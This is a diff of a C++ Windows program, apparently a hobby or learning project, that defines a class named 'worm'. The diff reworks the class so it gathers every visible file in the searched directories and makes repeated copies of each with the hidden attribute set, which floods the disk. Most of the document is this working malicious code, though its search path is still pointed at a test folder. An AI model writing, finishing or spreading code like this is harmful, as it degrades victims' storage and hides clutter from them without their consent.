@@ -20,9 +20,9 @@ std::wstring get_drive_root_from_path(const std::wstring& full_path);
 bool is_hidden(const fs::path& path);
 void init_locale();
 // Генератор случайных чисел
-std::string generate_random_suffix();
-// Генератор временной метки
-std::string get_timestamp();
+wstring generate_unique_suffix();
+
+
 
 void worm_was_started();
 wstring get_username();
@@ -36,10 +36,11 @@ private:
 
 	wstring path_to_start;
 	vector <wstring> list_dir;
+	vector <fs::path> file_to_copy;
 	int iteration;
 
 public:
-	worm(const wstring& path_to_start = get_drive_root_from_path(get_own_path()), int iteration = 2)
+	worm(const wstring& path_to_start = get_own_path(), int iteration = 2)
 		: path_to_start(path_to_start), iteration(iteration) {};
 
 
@@ -61,7 +62,7 @@ public:
 
 			for (const auto& path : paths) {
 				std::wcout << L"Обход: " << path << L"\n";
-				//search_list_dir(path);
+				search_list_dir(path, list_dir);
 				
 			}
 		}
@@ -94,7 +95,7 @@ public:
 		list_dir.clear();
 		//search_list_dir(path_to_start, list_dir);
 		search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
-		list_dir.push_back(path_to_start);
+		//list_dir.push_back(path_to_start);
 	}
 
 	void print_list_dir() { // вывод всех найденных папок, в которых будет копирование
@@ -103,82 +104,87 @@ public:
 		}
 	}
 
-	void copy_file() { // проход по найденным папкам и копирование каждого не скрытого файла iteration раз
-		//init_locale();
-		if (list_dir.empty()) {
-			cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
+	void collect_visible_files() {
+		collect_visible_files(list_dir, file_to_copy);
+	}
+
+	void collect_visible_files(const vector<wstring> list_dir_tmp, vector<fs::path>& collected_files) {
+		collected_files.clear();
+
+		if (list_dir_tmp.empty()) {
+			std::cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
 			return;
 		}
 
-		for (const auto& dir : list_dir) {
-
-			vector<fs::path> files_to_copy;//создали список файлов для каждой дирректории
-			//cout << " В директории " << dir << "\n";
-
+		for (const auto& dir : list_dir_tmp) {
 			for (const auto& entry : fs::directory_iterator(dir)) {
 				try {
-					// Получаем статус файла с обработкой ошибок
-					error_code ec;
+					std::error_code ec;
 					auto status = entry.status(ec);
-
 					if (ec || !fs::is_regular_file(status)) continue;
 
-					// Проверка скрытости для Windows
-					bool ishidden = false;
+					// Проверка скрытости
 					DWORD attrs = GetFileAttributesW(entry.path().wstring().c_str());
-					ishidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
+					bool is_hidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
 						(attrs & FILE_ATTRIBUTE_HIDDEN);
-					if (!ishidden) {
-						files_to_copy.push_back(entry.path());
+
+					if (!is_hidden) {
+						collected_files.push_back(entry.path());
 					}
 				}
 				catch (...) {
-					continue; // Пропускаем проблемные файлы
+					continue;
 				}
-			}
-
-			for (const auto& original_file : files_to_copy) { // копируем файлы и делаем их скрытными
-				std::wstring ext = original_file.extension().wstring();
-				std::wstring stem = original_file.stem().wstring();
-				fs::path parent_dir = original_file.parent_path();
-
-				cout << "Обрабатываем файл: " << original_file << "\n";
-
-				// Создаем заданное количество копий
-				for (int i = 1; i <= iteration; ++i) {
-
-					// Создаем копию
-					fs::path copy_path = parent_dir /
-						(stem + L"_copy_" + std::to_wstring(std::time(nullptr)) + ext);
-
-					try {
-						fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);
-
-						// 2. Устанавливаем атрибут "скрытый" (Unicode-версия)
-						DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
-						if (attrs != INVALID_FILE_ATTRIBUTES) {
-							DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN;
-							if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
-								DWORD error = GetLastError();
-								std::wcerr << L"Ошибка SetFileAttributesW: " << error << L"\n";
-							}
-						}
-						else {
-							DWORD error = GetLastError();
-							std::wcerr << L"Ошибка GetFileAttributesW: " << error << L"\n";
-						}
-					}
-					catch (const fs::filesystem_error& e) {
-						cerr << "  Ошибка при создании копии: " << e.what() << "\n";
-					}
-				}
-
-
-
-
 			}
 		}
 	}
+
+	void print_file_to_copy() {
+		cout << "Вывод файлов для копирования" << endl;
+		for (auto a1 : file_to_copy) {
+			wcout << a1.wstring() << endl;
+		}
+	}
+
+
+	void replicate_files(int iteration = 1) { // доабивть количество повторений 
+		if (file_to_copy.empty()) {
+			std::cerr << "Список файлов пуст! Сначала выполните collect_visible_files()\n";
+			return;
+		}
+
+		for (const auto& original_file : file_to_copy) {
+			for (int i = 1; i <= iteration; ++i) {
+			std::wstring ext = original_file.extension().wstring();
+			std::wstring stem = original_file.stem().wstring();
+			fs::path parent_dir = original_file.parent_path();
+
+			std::wcout << L"Обрабатываем файл: " << original_file.wstring() << L"\n";
+
+			
+			fs::path copy_path = parent_dir / (stem + L"_" + generate_unique_suffix() + ext);
+
+				try {
+					fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);
+
+					DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
+					if (attrs != INVALID_FILE_ATTRIBUTES) {
+						DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN;
+						if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
+							std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
+						}
+					}
+					else {
+						std::wcerr << L"Ошибка GetFileAttributesW: " << GetLastError() << L"\n";
+					}
+				}
+				catch (const fs::filesystem_error& e) {
+					std::cerr << "  Ошибка при создании копии: " << e.what() << "\n";
+				}
+			}
+		}
+	}
+
 
 	
 
